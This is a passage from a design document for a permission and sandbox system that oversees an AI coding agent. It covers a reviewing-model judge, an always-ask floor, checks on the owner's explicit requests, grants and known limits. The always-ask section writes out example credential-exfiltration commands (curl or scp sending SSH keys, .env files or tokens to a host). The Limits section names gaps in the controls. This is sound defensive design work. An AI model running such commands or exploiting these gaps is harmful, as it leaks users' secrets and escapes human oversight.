  downloading and running code; changing the permission setup.
- **Never sent**: contents of files being read.
- **What serves the request**: doing and checking the development work the user asked
  for, wherever it lives, inside the project folders or outside them: reading anything on
  this machine the work needs to be understood (other checkouts, logs, caches, and the
  installed app's own logs and data when the report is about it); building and testing it
  (scripts that download the project's pinned dependencies included) in `/tmp` or any
  worktree; making and tidying its own scratch space (worktrees it adds, branches it
  creates, clones and copies in `/tmp`, its `target/` directories); the chat's own private
  dev instance (`~/.cypher-development/<instance>`, run from its worktree), including
  stopping the processes it started; screenshots and read-only window or app queries;
  read-only process checks (`ps`, `lsof`, `sample`, `lsappinfo info`); read-only requests
  to a server (fetching a page or a release file, `gh run view`, `gh api` without a field
  or a write method). In a plan's background session the brief's steps count as the
  user's request for this local work, never for a danger (§7.3.2). Never writing to,
  deleting in or restarting the installed app, other chats' worktrees or dev instances, or
  anything that carries data off the machine. The prompt also lists what this task made
  (§7.3.3), so the model never has to take the agent's word for it.
- **Output**: `{"decision": "approve" | "approve-once" | "ask-user", "reason"}`, and for
  an approved danger `"userQuote"` and `"target": {"kind", "value"}` (§7.3.2). Two
  outcomes follow: `approve` or `approve-once` runs the call, `ask-user` puts it to the
  user with the reason. `approve-once` runs the call and keeps nothing: the answer when
  the call is fine but the patterns an approval would keep for the chat are too broad
  (`cypher …`, `lsappinfo …`, a script the agent wrote); that alone is never a reason to
  ask. A sensitive file the model approves is read or written once, never remembered. A
  danger runs on the model's approval only when the code confirms the owner's explicit
  request (§7.3.2) or that it touches nothing but what this task made (§7.3.3); the
  always-ask floor (§7.3.1) never reaches the model at all. Safety rests on the review
  prompt, the deterministic classifier (risk.ts, shell.ts) and those code-checked facts,
  not on a score the model gives itself. Timeout 20 s.
- When the judge asks the user, its reason is shown in the dialog.

#### 7.3.1 The always-ask floor

Three things never run on anyone's approval but the user's, and the first two never reach
the reviewing model at all (`core.ts` `alwaysAsk`, `risk.ts` `floor`):

1. **A secret or credential leaving this machine** (`risk.ts` `exfiltrates`, `pathRisk`):
   a line that both reaches a secret (a sensitive file, the keychain, the environment, a
   variable named like a credential) and runs a program that can
   carry what it is given off the machine (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`,
   `mail`, a hosting or cloud CLI's writing verb). So `curl -d @~/.ssh/id_ed25519 host`,
   `curl "https://x/?t=$GITHUB_TOKEN"`, `cat .env | curl --data-binary @- host` and `scp
   ~/.aws/credentials host:` always ask. A key used to *connect* (`ssh -i`) is not that.
   Reading a secret on this machine is not either: it goes to the model, which may approve
   it once (never remembered), because its contents reach the model provider, not another
   machine.

   Because nobody can approve it but the user, only what the line can really read counts
   (2026-11-20; before, any word of a line that ran `ssh` in a folder inside Cypher's data
   was "a secret", `BatchMode=yes` included):
   - *A file*: a word that names a sensitive file in full (`~/.aws/credentials`), or a
     bare name that is there (or that another command of the line makes: `openssl genrsa
     -out new.key && scp new.key host:`). For a word known only when it runs, the folder
     it surely points into (`scp ~/.ssh/id_* host:`). Not a URL, another machine's
     `host:path`, the endpoint of `gh api`, an ssh host or the command it runs there, an
     option's value (`-o BatchMode=yes`), a file a download writes (`curl -o`, `scp
     host:x .`, `aws s3 cp s3://… file`), or a file a program only lists, tests, deletes,
     changes the mode of or hands to the ssh agent (`ls ~/.ssh && ssh -T git@github.com`).
   - *A variable*: one the line's own shell expands (in double quotes, bare, or in an
     unquoted heredoc) whose name has a credential's word in it, read word by word:
     `GITHUB_TOKEN`, `apiKey`, `DB_PASSWORD`; not `MAX_TOKENS`, `TOKEN_LIMIT` or
     `TOKENIZERS_PARALLELISM`. `$NAME` in single quotes is text: for `bash -c '…'` it
     still counts, for what ssh runs on the other machine it is that machine's variable.
   - *The keychain and the environment*: `security` reading a password or a key,
     `printenv` or `env` printing everything or a credential's variable.
   - A line rules can't read is held to the same floor by its text: a credential's
     variable or a sensitive file named in full, with a program that sends.
2. **A change to the permission system itself** (§3.6): its policy files, the settings that
   say which extensions load, its extension's code, its audit log, its session files.
   Written as an operand, through a redirection, or inside a script (`python3 -c
   "open('…/permissions.json','w')"`). The file tools too: such a write skips the model and
   the dialog says *Only you can approve this*.
3. **No reviewing model** (`review`): none configured, paused after repeated failures, an
   error, or no answer within 20 s. The request goes to the user with the reason.

A rule the user set to `ask` or `deny` counts as the floor too: they asked to be asked.
Everything else reaches the model.

#### 7.3.2 Explicit requests: the owner's own words (2026-11-18)

The owner: *"任何操作，比如创建pr，只要我消息明确说了，那就应该自动审核同意。而不是再让我同意一次"*
(any operation, creating a PR for example: when my message said so explicitly, approve
it, instead of asking me again). Code: `cypher-permissions/explicit.ts`.

A dangerous command (publishing a package or a release, deploying, a global install,
sending data to a server, opening, merging or commenting on a pull request, pushing a
branch or a release tag, force-pushing, deleting a remote branch) runs once, without a
dialog, when:

1. **The model approves it and quotes the owner** (`userQuote`).
2. **The quote is the owner's.** It occurs in one of the owner's own messages, as written
   apart from whitespace, case, punctuation and full-width forms (NFKC). It must say
   something: "继续", "Continue", "go ahead", "ok", "发布吧" or "push 这个" alone never
   do (a vague list, and a minimum length where a CJK character counts twice).
3. **The target is the command's and the owner's.** Cypher reads what each dangerous
   command acts on from the line (`lineTargets`): the pull request `gh pr merge 52`
   merges (`-R` or its URL's repository), a new pull request's base and head, the branch
   or tag `git push <remote> <ref>` publishes (a tag the line creates with `git tag x
   <commit>`, an existing tag, a branch `git switch -c` makes), the release `gh release
   create` makes, the package `npm`/`cargo publish` publishes (from `package.json` or
   `Cargo.toml`), what a global install installs, the host `curl`, `ssh`, `scp` or
   `rsync` reach. The model's `target` must be one of them, and the owner's message
   holding the quote must ask for the action ("merge", "合并", "push", "推", "release",
   "发布", "publish", "install", a PR) and name the target or plainly imply it:
   - the pull request's number (`#52`, `PR 52`, `/pull/52`); without one, a message
     asking to open a PR and merge it covers the one this chat opened (a `gh pr create`
     whose result names exactly that pull request). A message naming #52 never covers #53;
   - the branch by name (`main` in "pr 给main");
   - the tag by name, or its version ("0.4.5"); or, for "release a new version" ("最新的
     main代码发布全新版本吧"), a tag whose commit is on the remote's default branch (as last
     fetched) and whose files hold the tag's version (`git grep -F -w`). A message naming
     another version never covers it;
   - the package's name or version; the host's name;
   - a remote other than `origin`, or a repository other than the checkout's origin, by
     name.
4. **Nothing since takes it back.** Every message the owner wrote after it must carry on
   ("好了 继续发布", "try again", one naming the same target): a retraction ("先别 push",
   "不要合并", "wait", "cancel", "instead") or a message about something else makes the
   request stale, so it asks. A retraction is a sentence with such a word that is about
   what the command does (its target or its action), or that says nothing else ("wait",
   "先别", "don't do that yet"); a "don't" about something else ("ok, and don't forget
   the changelog") takes nothing back, and a reminder ("don't forget to merge it") is
   none. The message holding the quote must not say not to either: "open a PR, don't
   merge it" and "pr 给 main，先别合并" ask for no merge, though they say the word.

A host is named by its name, its first label (`web` for `web.example.com`) or what its
alias starts with (`gamma` for `gamma-cluster`).

Still asked, whatever the model says: the always-ask floor (§7.3.1), checked first; a
target known only when the line runs (`git push origin $BRANCH`, `gh pr merge $(…)`, a
`gh pr merge` that names no pull request, a tag pushed from a loop, a line rules can't
read); and a danger whose target Cypher reads no name for, because the owner's words
could not name it either — a pid a `kill` stops, a file a `rm` deletes, the installed
app's data a program is pointed at, `gh api` writes, a package `npx` downloads and runs.
Words known only when the line runs are fine where they don't change the target: a pull
request's `--body "$(cat …)"`, a title from a variable, a heredoc body, `--body-file`. The
audit records each explicit decision (`explicit`: `ok`, the quote and whether it came from
a typed message or a plan's instruction, the targets, which checks passed, or why not),
and the dialog's Review row says why a quoted request wasn't confirmed.

**Only the owner's words count.** The engine passes them in `CYPHER_OWNER_WORDS`, an
environment variable the harness sets when it spawns Pi (`crates/harness/src/pi/spawn.rs`,
beside `CYPHER_PERMISSION_LEVEL`): JSON `{"messages": [{"text", "source": "typed" |
"plan"}], "agentWritten"}`, at most ten messages of 2,000 characters, 12,000 in all. A
running agent can't change its own process's environment. A Pi process outlives the turn
it was started for, though: the owner's next message is routed into it, and is not in the
environment it started with. So before it checks a danger the extension asks the engine
for the words as of now (`OwnerWords {chatId}` on the agent socket, answered only for a
chat on this device and read from the same ledger; `Permissions.ownerWordsNow`). When the
engine can't be asked (an older Cypher, no Cypher), the words it started with stand, and
the worst that happens is a question. The words come from the chat's
command ledger, not from Pi's conversation, where agents' messages sit as user messages:

- Every message command says who wrote it when no person did
  (`SessionCommandEntry::author`, signed with the entry): `plan` for a plan's brief and the
  prompts its background session starts and steers sessions with, `subagent` for a parent
  chat's task, `routine`, `peer` (another person's workspace), `memory`. Only the
  engine's own callers set it (`DocHost::queue_agent_command`); the RPC surface the UI and
  agents use can't. Entries written before it existed are told by their message ids
  (`*-brief`, `peer-*`, `bot-answer-*`) and, in a chat an agent started (a plan's session or
  thread, a subagent, a workspace thread other than the owner's chat, a memory pass), by
  being its first message.
- A person's message counts once its host took it for execution (applied, or pending and
  in the processed ledger); a rejected, expired or superseded one never does.
- A plan's sessions and its background thread also get the owner's instruction from the
  plan's record (`BotWork::instruction`, the owner's message it was proposed from,
  capped at 1,500 characters), first. What the owner types into such a session counts
  too; the start prompt, `steer_session` and `answer_session` (an answer, not a message)
  never do.

Without the variable (an older Cypher, or Pi started by hand), no danger runs on an
explicit request.

#### 7.3.3 What this task made (2026-11-18)

The other fact a danger may run on: the action touches nothing but what this task made
itself. Cypher records that from the commands the chat actually ran, not from what the
model says (`cypher-permissions/created.ts`):

- Every bash call the extension lets through — in the sandbox or outside it — is read by
  the shell reader, and what it creates is recorded (`noteCreated`, `creationsOf`): the
  path and branch of a `git worktree add`, a branch from `git switch -c` / `checkout -b` /
  `git branch <name>`, a `git clone`'s directory, the operands of `mkdir`, `install -d`,
  `touch` and `tee`, a copy's destination, the files its redirections write, and the data
  directories of a dev instance it names (`CYPHER_DEV_INSTANCE=<name>` →
  `~/.cypher-development/{local,dev}-{engine,ui}-<name>` and their logs, or
  `CYPHER_DATA_DIR=<path>` under `~/.cypher-development`). Never the whole
  `~/.cypher-development`: other chats keep their instances there.
- Nothing sensitive, protected, Cypher's own, the installed app's or the permission
  system's is ever recorded, however it was created (`recordable`), so a write the owner
  approved once can never become a free hand to delete it later.
- The record is kept with the chat, like a grant (session entries
  `cypher-permissions.created`, tagged with the chat id, bounded), so it holds across the
  turns of one chat and never crosses into another.
- The chat's own workspace roots and the temp directories count as its own anyway
  (`disposable`), and so does the branch checked out in a workspace root, which is the
  work Cypher gave the chat (`workspaceBranches`, never a default branch).

What that makes local work instead of a danger (`risk.ts` `facts.created`): `git worktree
remove` of a worktree it added, `git branch -D` of a branch it created or is working on,
`rm -rf`, `mv` and `chmod -R` of a directory or file it made (its dev instance, its
`target/`, its clones and scratch files), `git reset --hard` / `checkout --` / `clean -f`
in a checkout it made, `kill` of processes running in it or using it as their data
directory (`processFacts.inCreated`), and a write under its dev instance's own Runtime
directory. Anything else — another chat's worktree, a branch it did not make, a path it
never created — stays a danger and asks.

### 7.4 Human approval

`ctx.ui.select`, which Cypher bridges to a question in the desktop and iOS apps
(`crates/harness/src/pi/session/ui.rs`): the chat shows *Awaiting input* and the push
notification is sent. Dialogs are serialized, so parallel tool calls never stack them.

The dialog names what is asked (`write outside the workspace`, `read a sensitive path`,
`write a protected path`, `write Cypher's own data`), the paths and the matching pattern,
the tool and command, the network effect, the agent's reason, the change, and the judge's
verdict.

| Option | Grant | Offered for |
|---|---|---|
| Allow once (Run once outside the sandbox) | `once` | all |
| Allow for this chat | `chat` | all; for a command, its patterns |
| Always allow | `always` (a rule in `permissions.json`) | file tools, not sensitive, not self; commands with patterns |
| Deny | — | all |
| Deny and stop | — (aborts the turn) | all |

No timeout by default: an unattended run waits for a remote approval. `ask.timeoutMs`
denies after a delay. Without a UI (print mode) a request is denied.

### 7.5 Grants

```ts
interface Grant {
  id: string;
  capability: "read" | "write";   // write implies read
  paths: string[];                // canonical; a directory covers its subtree
  pattern?: string[];             // a command rule: matching commands run outside the sandbox
  label?: string;                 // what the pattern is for
  sha256?: string;                // the pinned program, when it lives in a writable place
  sensitive?: boolean;
  scope: "once" | "chat" | "always";
  approvedBy: "user" | "judge" | "rule";
  createdAt: string;
  chatId?: string;
}
```

- `once`: in memory, consumed by the next matching use. Pi runs one process per turn, and
  a once grant is asked for and used in the same turn.
- `chat`: a `cypher-permissions.grant` custom entry in the Pi session file, tagged with
  `CYPHER_CHAT_ID`. Cypher forks a chat by copying its session file
  (`crates/harness/src/pi/fork.rs`), so entries from another chat id are ignored: a fork
  starts without grants. Revocation appends `cypher-permissions.revoke`.
- `always`: a rule in `permissions.json`.
- A sandboxed command runs with the non-sensitive path grants; a sensitive grant serves
  the file tools only. Grants bound to one command's text (from older Runtimes) are
  dropped when a session is restored.
- Pseudo-paths: `net:<domain>` (the filter proxy), `tool:<name>` (an MCP or extension
  tool). They never become filesystem rules.
- A child chat (subagent) does not inherit its parent's grants.

## 8. Audit and commands

`<agent-dir>/permission-audit.jsonl`, one JSON line per decision that was not a plain
default allow: time, chat id, tool, command, capability, zone, guard, paths, decision,
who decided (`policy`, `grant`, `rule`, `judge`, `user`, `sandbox`), reason, grant id and
scope. Rotated at 10 MB (one previous file kept).

**Settings → Permissions** (desktop, per device; `crates/ui/src/settings/permissions.rs`)
edits the part of `permissions.json` it shows through `GetPiPermissionSettings` /
`SetPiPermissionSettings` (`crates/engine/src/pi/permissions.rs`, forwardable to any
device) and keeps everything else in the file as written. It shows whether the device can
sandbox (the engine runs the Runtime's `landstrip doctor`), the approval mode per request
kind (every row offers "Model first", the default; Cypher's own data is always "Ask me"), the
reviewing model (the chat's model or any catalog model), the MCP/extension tool default
and a per-server override for each configured MCP server, the network mode, local servers,
the extra sensitive / protected / writable / allowed-domain / Unix-socket lists, the
command rules (what runs outside the sandbox, what always asks, what never runs) with
Remove, and the always-allow rules with Remove. Running outside the sandbox is "Ask me" or
"Deny".

**Approval dialogs** ride Cypher's question channel (`ctx.ui.select` → the harness's
`UserInputQuestion` → the composer's question card, iOS's question panel, the push
notification), but are not questions. The title is `question\n\nContext:\n` followed by
one `Label: value` line per fact (`Path`, `Matches`, `Domain`, `Tool`, `Command`,
`Purpose`, `Pattern`, `Reason`, `Note`, `Review`; `Network` from older Runtimes), with a
`Change:` or `Input:` block last; paths show the home directory as `~`. Its last line is for
Cypher only: `cypher-permission: {"kind": "escalate" | "access" | "network" | "tool",
"toolCallId": "…"}`. The harness strips it (`pi/wire.rs` `permission_prompt`) and sets
`UserInputQuestion.permission` (`cypher_proto::PermissionPrompt`): what the prompt is about
and the tool call it gates. The desktop lays a permission prompt out as a permission card
(`crates/ui/src/composer/permission_card.rs`, `question_card.rs`; a prompt from an older
Runtime is recognised by its "Deny and stop" option): the facts as rows, the sentences as
notes, the change in a code block, and the options as buttons weighted by what they grant
(the narrowest approval filled, broader ones outlined, Deny quiet, Deny and stop in red).
Other clients show the same text as a headline over a context block.

**In the transcript** a permission prompt never reads as a question. Each tool result
carries how permission control treated it, as a `cypherPermissions` record in its details
(`{ outcome: "outside" | "blocked" | "denied" | "allowed", scope?: "once" | "chat" |
"always" | "rule", rule?, purpose? }`), which the harness folds into the tool part's
`permission` (`cypher_proto::ToolPermission`) and strips the `[permissions]` notes meant
for the model from the shown output. The desktop (`transcript/rows.rs`
`PermissionFold`):

- files an answered prompt under the call it gated (`toolCallId`): no row of its own, so
  it does not split the work run;
- folds a command the sandbox blocked into the run of the same command that followed
  (outside the sandbox, or refused): one row, the attempt's output first in its detail;
- puts a badge on the call's row ("Outside the sandbox · this chat", "Blocked by the
  sandbox", "Denied", "Allowed for this chat"; outside in the warning tint), and shows a
  blocked or denied call calm, with a muted cross, not as a failure;
- counts them in the run's summary ("Ran 3 commands · 2 outside the sandbox · 1 denied");
- shows a prompt it cannot file under a call as a "Permission" row with a shield, not a
  "Question".

A call the extension keeps no record of (an MCP tool) that a prompt gated shows
"Allowed" or "Denied" by whether it ran. The new fields are additive and older readers
ignore them.

**iOS** does the same: the transcript (`Transcript/TranscriptRows.swift`
`PermissionFold`, `PermissionBadge` with the same shield icons), a permission card in
place of the question panel (`Composer/PermissionPanel.swift`: the facts as rows, one tap
answers), `/permissions` leading Agent modes in the `/` menu with the amber shield beside
the model chip at Full access, and Permissions in the account menu
(`Permissions/PermissionSettingsView.swift`): a device's settings through the relay's
`GetPiPermissionSettings` / `SetPiPermissionSettings`, kept as raw JSON so a save never
drops a field the phone does not know. The tool rows carry no output on iOS, so a folded
attempt shows only in its badge and the summary.

**Shortcuts** (desktop permission card; letters shown as keycaps on the buttons): `Y` the
narrowest approval (Allow once / Run once / Allow for this command), `C`
for this chat, `A` always (when offered), `N` deny, `S` deny and stop, `⌘↵` the narrowest
approval, `esc` dismiss (no approval), and number keys by position. Plain `↵` approves
nothing. The card takes keyboard focus wherever focus lands on its composer (opening, chat
switches), never from another chat or a terminal; keys within 500 ms of the card appearing
and held-key repeats are ignored, so typing into the composer as a request arrives never
answers it.

An escalation's record may carry `explicit` (§7.3.2): whether a danger ran as the owner's
explicit request, or why only the user can approve it (the always-ask floor, §7.3.1); the
words the model quoted and whether they were typed or a plan's instruction, what the line
acts on, which checks passed (`quote`, `target`, `current`), or why not.

Commands:

- `/perm`: level, sandbox, workspace roots, defaults, approval modes, grants, command
  rules, warnings.
- `/perm-grants`: list; `/perm-grants revoke <id>`; `/perm-grants clear`.
- `/perm-root add|remove <path>`: extra workspace roots for this chat. A slash command is
  typed by the user, so it is itself the approval.
- `/perm-log`: this chat's recent decisions.

## 9. Code map

| File | Role |
|---|---|
| `extensions/cypher-permissions.ts` | Pi wiring: tool re-registration, `request_permission`, events, the apply_patch hook, commands |
| `cypher-permissions/core.ts` | State, the approval pipeline, checked operations, launch plans |
| `cypher-permissions/config.ts` | Defaults, user and project merge, levels, approval modes |
| `cypher-permissions/paths.ts`, `glob.ts` | Canonical paths, patterns, zones and guards |
| `cypher-permissions/policy.ts` | Zone × capability → decision |
| `cypher-permissions/grants.ts` | Grants and their persistence |
| `cypher-permissions/discover.ts` | Concrete paths for Landstrip; the home index |
| `cypher-permissions/sandbox.ts` | Landstrip status, policy compiler, wrapper, env scrub, denial events |
| `cypher-permissions/judge.ts` | Judge prompt and verdict parsing |
| `cypher-permissions/risk.ts`, `packs.ts` | The risk classifier: an action's tier, the always-ask floor, what each program does |
| `cypher-permissions/created.ts` | What this task made, read from the commands it ran: the facts a danger over its own leavings rests on (§7.3.3) |
| `cypher-permissions/explicit.ts` | Explicit requests: the owner's words, what a dangerous line acts on, the quote, target and retraction checks (§7.3.2) |
| `crates/engine/src/host/doc_host/owner_words.rs` | The owner's words from a chat's command ledger (`CYPHER_OWNER_WORDS`); `SessionCommandEntry::author` marks agents' messages |
| `cypher-permissions/audit.ts` | The audit log |
| `cypher-permissions/shell.ts` | Reading a command line into every command it can run and the files it redirects, or opaque |
| `cypher-permissions/commands.ts` | Command rules: patterns, validation, the banned programs, categories, resolving a program |
| `crates/engine/src/pi/permissions.rs` | The settings Settings → Permissions edits; `landstrip doctor` |
| `crates/ui/src/settings/permissions.rs` | Settings → Permissions |
| `crates/ui/src/composer/slash_menu.rs`, `slash.rs` | `/permissions` in the composer's `/` menu |
| `crates/ui/src/pickers/` (`PERMISSION_LEVELS`, `PickerKind::Permissions`) | The level names; the Full access shield and its menu |

Tests: `cypher-permissions.test.mjs` (engine, no Pi or Landstrip),
`cypher-permissions-replay.test.mjs` (every question that reached the owner in the week
from 2026-11-11, sanitized in `cypher-permissions-replay/`, replayed through the
classifier and the decision path with the judge's verdict stubbed per case; the
explicit-request cases carry the owner's words and adversarial probes that must still
ask; `cypher-permissions-replay/harness.mjs` is its fake machine, and
`cypher-permissions-replay/live.mjs`, run by hand and never by `npm test`, puts the same
cases and probes through the real reviewing model, as claude-bridge calls it, with each
case's conversation from a context file kept outside the repository) and
`cypher-permissions.staged.test.mjs` (a real `bin/pi` in RPC mode from a staged Runtime,
a scripted faux model that also answers as the judge, the real Landstrip, the patched
grep and apply_patch, dialogs answered over RPC). The package script runs both on macOS and Linux builds; the
staged suite skips its sandbox cases where `landstrip doctor` fails. Rust:
`pi::permissions` (the settings file merge), `tests/chat_permission_level.rs` (the row's
level wins), the harness's `CYPHER_PERMISSION_LEVEL` and `CYPHER_OWNER_WORDS` tests,
`host::doc_host::owner_words` and `tests/bot_work.rs` (a plan's runs carry the owner's
words, never the brief or steering, and `OwnerWords` answers the same on the agent
socket), and the picker and Settings page unit tests.

## 10. Phases

- **Phase 0, spike**: done (the measurements in §6.2 and §11).
- **Phase 1, core**: done. Engine side: `CYPHER_PERMISSION_LEVEL` from
  `RunRequest.sandbox`; `cypher-permissions.ts` in `CYPHER_EXTENSIONS`; the
  `pi-permission-control` special cases removed from `runtime.rs` and `packages.rs`;
  `@landstrip/*` is bundled but, like `@earendil-works/*`, not a Pi plugin
  (`package-pi-runtime.sh`, `scripts/ci/release.py`).
- **Phase 2, Cypher UI**: done. `/permissions` in the composer (§5.2) and the engine
  honoring the row's level; Settings → Permissions with the device's sandbox status
  (§8); structured approval cards. A chat's grants are listed and revoked with
  `/perm-grants` (the composer's `/` menu).
- **Phase 3**: done. The filtered network (§4.2); per-MCP-server decisions in Settings →
  Permissions. (Linux live approvals, which held a denied syscall while the user was
  asked, were removed in phase 4.)
- **Phase 4, leaving the sandbox**: commands that need more than the sandbox run outside it
  once the user allows them, by command rules the agent proposes (§6.3). The per-command
  grants to sensitive paths, the network and environment variables, and Linux live
  approvals, are gone: a sandboxed command never holds a secret.

## 11. Limits

- **The Pi process is trusted.** `read`/`write`/`edit`/`ls` are enforced by this code in
  Pi's process, not by the kernel. MCP servers and other extensions run unsandboxed;
  MCP tools are allowed by default.
- **Same-user attacker**: not defended; use a VM (for example Docker `sbx`).
- **Secrets outside the workspace, for bash**: a secret created outside the workspace is
  denied to file tools at once, but to bash only after the home index refreshes (up to
  10 minutes; caches and `node_modules` are not indexed).
- **No taint tracking across a turn**: a secret read into the model's context (a file
  tool approval) can later leave through a command's network.
- **Outside the sandbox nothing applies**: an allowed command has the user's files,
  credentials, network and processes within what its pattern matches. A program that reads
  workspace files as code (`make`, `npm` scripts, `cargo` build scripts) runs them with
  those rights; the dialog shows the command, not what it will read. Git hooks and config
  are protected (§3.4), so the agent cannot plant code for an allowed `git` command.
- **A command that needs more fails once first** (§6.3), on both platforms.
- **Filtered network**: only programs that honor `HTTP(S)_PROXY` reach allowed domains;
  others run outside the sandbox when allowed. Domain filtering sees host names (CONNECT
  and the `Host` header), not URLs.
- **`/permissions`** is still offered on a device where permission control is
  unavailable; Settings → Permissions says so, and the chat runs unrestricted there.
- **Linux (Landstrip 0.18.38)**:
  - A background process (`npm run dev &`) loses file access once the command that
    started it exits: the seccomp broker ends with it. Keep long-running processes in the
    foreground of their own command.
  - Writing through `/dev/stdout`, `/dev/stderr` or `/dev/fd/N` by name is denied (a rule
    on them makes Landlock reject the policy); `>&2` and redirects are unaffected.
  - Inside a Docker container with Docker's default seccomp profile every connect fails;
    run the container with `--security-opt seccomp=unconfined` or on the host.
- **grep**: ripgrep exits with an error if it meets an unreadable file that was created
  after the policy was compiled (within 1.5 s).
- **Hard links into the workspace** of external files: Landstrip blocks links to denied
  paths; linking other external files is not restricted.
- **Explicit requests** (§7.3.2): the owner's words reach Pi when its turn starts, so a
  message the owner steers into a running turn counts from the next turn. A forked chat
  starts without its source's commands, so without its words. A process outside the
  sandbox that can reach the engine's socket could queue a message as the owner; the
  socket of the installed app is under `~/.cypher`, which only a human may let a command
  touch. Old message commands of a plan's session that an older orchestrator steered carry
  no author and count as the owner's.

## 12. Decisions and open questions

Decided (2026-10-11):

- **D1.** `external.write` defaults to `assisted`.
- **D2.** MCP and extension tools are allowed by default; overrides tighten.
- **D3.** Persistence paths (`.git/config`, hooks, shell startup files) are protected, not
  sensitive: writes go to the judge first.
- **D4.** `full-access` runs everything unchecked and unsandboxed.
- **D5.** On hosts where Landstrip cannot sandbox, the extension stands down and says so.
- **D6.** The code lives in this repository as a Runtime extension; the npm
  `pi-permission-control` package is dropped.
- **D7.** Cypher's and Pi's data is split: its secrets are sensitive, the rest is
  self-guarded (readable, human-only writes), worktrees are neither.
- **D8.** The judge defaults to the chat's own model.
- **D9.** (2026-10-13) Composite resources (SSH, Git remotes, keychains, processes,
  system services) are reached by running the command outside the sandbox with the
  user's approval, by command patterns the agent proposes, not by widening the sandbox
  piece by piece. The sandbox never hands a command a secret.
- **D10.** (2026-10-15) The model judges first for every kind of request except writes to
  Cypher's own data: sensitive files, commands outside the sandbox and MCP/extension tools
  included. Its approvals stay one-off; the user is asked about the rest.
- **D11.** (2026-10-20, permission-friction.md) Risk tiers replace "outside means ask":
  inspections run outside without asking, local work goes to the model (whose approval is
  remembered for the chat) and is kept per project when a human approves it, dangerous
  work (and protected writes) always asks a human, for the task at most. D10's "model
  first" now excludes dangerous work.
- **D12.** (2026-11-18) The judge answers `approve`, `approve-once` or `ask-user`, with no
  confidence score and no bar to clear: its approval is the decision, for local work and
  sensitive files alike (a sensitive file once, never remembered), and anything else asks
  the user. A `judge.minConfidence` key in the user's file is ignored. A danger also needs
  the owner's explicit request, checked by the code (D13).
- **D13.** (2026-11-18) A danger the owner's own words explicitly ask for runs once
  without a dialog when the model approves it and the code confirms the model's quote and
  target (§7.3.2); without that confirmation it always asks. Only words a person wrote
  count, passed by the engine in `CYPHER_OWNER_WORDS`; agents' messages are marked in the
  command ledger.

- **D14.** (2026-11-18) The reviewing model decides nearly everything, and the floor is
  small (§7.3.1): local work is the model's wherever it touches this machine (reads
  anywhere, builds and tests, worktrees, `/tmp`, the chat's own dev instance, reading the
  installed app's data for a diagnosis, read-only GETs and window queries), and a danger
  runs on a fact the code checks — the owner's words (D13) or that it only touches what
  this task made (§7.3.3, recorded from the commands the chat ran). A secret leaving the
  machine and a change to the permission system's own files always ask, as does an
  unavailable reviewing model. Reading a secret here is local work the model may approve
  once, never remembered (the owner chose this on 2026-11-18); `~/.cypher*/**/sessions/**`
  and `settings.json` were added to the floor on the owner's answer the same day.
- **D15.** (2026-11-20) What nobody but the user can approve must be exact. The owner
  was asked about `ssh -o BatchMode=yes gamma-cluster '…'` as "sends a secret off this
  machine (BatchMode=yes)": the chat ran in a workspace's folder, which lies in Cypher's
  data, and every word of an `ssh` line was read as a file there. Since then a secret
  leaving the machine counts only what the line can read (§7.3.1), a workspace's own
  folder is its project (§3.1), attachments are read without a question (§3.3), the
  reader follows `case`, `{ …; }`, `$((…))`, a heredoc in a substitution and a
  redirection to a path known only when it runs instead of giving up on the line (§6.3),
  `find -exec` is judged by the command it runs, the owner's words are the ones written by
  now (§7.3.2), and a later "don't" takes back only what it is about. The other way: a
  project's own rules file is protected from the file tools and the sandbox (§3.4), a
  message's own "don't merge" is honoured, and a line rules can't read is held to the
  secret floor too.

Open:

- **Q1. Command-scoped "always" rules**: resolved by command rules (§6.3, decided
  2026-10-13): approved commands run outside the sandbox; the shell reader refuses lines it
  cannot read reliably.
